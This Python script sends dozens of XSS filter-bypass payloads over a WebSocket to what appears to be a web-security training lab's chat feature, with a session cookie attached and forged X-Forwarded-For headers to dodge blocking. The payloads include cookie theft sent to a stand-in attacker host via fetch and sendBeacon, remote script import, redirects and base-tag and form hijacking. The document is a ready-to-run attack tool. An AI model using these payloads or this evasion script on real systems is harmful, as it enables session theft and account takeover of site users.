#!/usr/bin/env python3
import asyncio
import websockets
import json

async def test_xss():
    url = "wss://0a9f00fb048cba34808035000032001d.web-security-academy.net/chat"
    
    # Advanced bypass techniques avoiding "alert", "onerror", "onload", and "javascript:"
    payloads = [
        # Using print instead of alert
        "<img src=x onerror=print(1)>",
        "<svg onload=print(1)>",
        
        # Using location redirect instead of alert
        "<img src=x onerror=location='http://evil.com'>",
        "<svg onload=location='http://evil.com'>",
        
        # DOM manipulation without alert
        "<img src=x onerror=document.body.innerHTML='XSS'>",
        "<svg onload=document.body.innerHTML='XSS'>",
        
        # Using fetch for data exfiltration
        "<img src=x onerror=fetch('http://evil.com?c='+document.cookie)>",
        "<svg onload=fetch('http://evil.com')>",
        
        # Cookie stealing without alert
        "<img src=x onerror=navigator.sendBeacon('http://evil.com',document.cookie)>",
        
        # Using console.log
        "<img src=x onerror=console.log('XSS')>",
        "<svg onload=console.log('XSS')>",
        
        # HTML5 events that might not be filtered
        "<body onpageshow=print(1)>",
        "<body onhashchange=print(1)>",
        "<body onresize=print(1)>",
        "<body onscroll=print(1)>",
        
        # Form-based XSS
        "<form><button formaction='http://evil.com'>Click</button></form>",
        "<form action='http://evil.com'><input type=submit>",
        
        # Meta refresh
        "<meta http-equiv='refresh' content='0;url=http://evil.com'>",
        
        # Base tag hijacking
        "<base href='http://evil.com/'>",
        
        # Using data URLs (might bypass filters)
        "<object data='data:text/html,<script>print(1)</script>'>",
        "<iframe src='data:text/html,<script>print(1)</script>'>",
        
        # CSS injection for data exfiltration
        "<style>body{background:url('http://evil.com')}</style>",
        
        # Using less common events
        "<details open ontoggle=print(1)>",
        "<input autofocus onfocus=print(1)>",
        "<select autofocus onfocus=print(1)>",
        "<textarea autofocus onfocus=print(1)>",
        "<video><source onerror=print(1)>",
        
        # SVG with different events
        "<svg onmouseover=print(1)>",
        "<svg onclick=print(1)>",
        
        # Link-based XSS
        "<a href='http://evil.com'>Click me</a>",
        
        # Using window.open
        "<img src=x onerror=window.open('http://evil.com')>",
        "<svg onload=window.open('http://evil.com')>",
        
        # Double encoding attempts
        "<img src=x on%65rror=print(1)>",
        
        # Constructor bypass
        "<img src=x onerror=constructor.constructor('print(1)')()>",
        
        # Using top/parent/self
        "<img src=x onerror=top.location='http://evil.com'>",
        "<img src=x onerror=parent.location='http://evil.com'>",
        "<img src=x onerror=self.location='http://evil.com'>",
        
        # WebSocket hijacking
        "<img src=x onerror=new WebSocket('ws://evil.com')>",
        
        # Import statement
        "<img src=x onerror=import('http://evil.com/xss.js')>",
    ]
    
    successful = []
    
    for i, payload in enumerate(payloads):
        # Rotate IPs to avoid blocking
        headers = {
            'X-Forwarded-For': f'127.0.0.{i+100}',
            'Cookie': 'session=2HQSLLJZkjvQo1iCKN32guMIwjRZMEBe',
            'Origin': 'https://0a9f00fb048cba34808035000032001d.web-security-academy.net',
        }
        
        try:
            async with websockets.connect(url, extra_headers=headers) as ws:
                print(f"[{i+1}] Testing: {payload[:60]}...")
                
                # Send as JSON message
                message = json.dumps({"message": payload})
                await ws.send(message)
                
                # Get response
                response = await asyncio.wait_for(ws.recv(), timeout=2)
                
                # Check response
                if "error" in response:
                    error_msg = json.loads(response).get("error", "")
                    print(f"    Blocked: {error_msg}")
                else:
                    print(f"    [+] PASSED FILTER! Response: {response[:100]}")
                    successful.append(payload)
                    
        except websockets.exceptions.ConnectionClosed:
            print(f"    [!] Connection closed")
        except asyncio.TimeoutError:
            print(f"    [!] Timeout")
        except Exception as e:
            print(f"    [!] Error: {e}")
        
        await asyncio.sleep(0.5)
    
    print("\n" + "="*60)
    if successful:
        print(f"[+] {len(successful)} payloads passed the filter:")
        for p in successful:
            print(f"    {p}")
    else:
        print("[-] All payloads were blocked")

if __name__ == "__main__":
    print("Advanced WebSocket XSS Filter Bypass Test")
    print("="*60)
    asyncio.run(test_xss())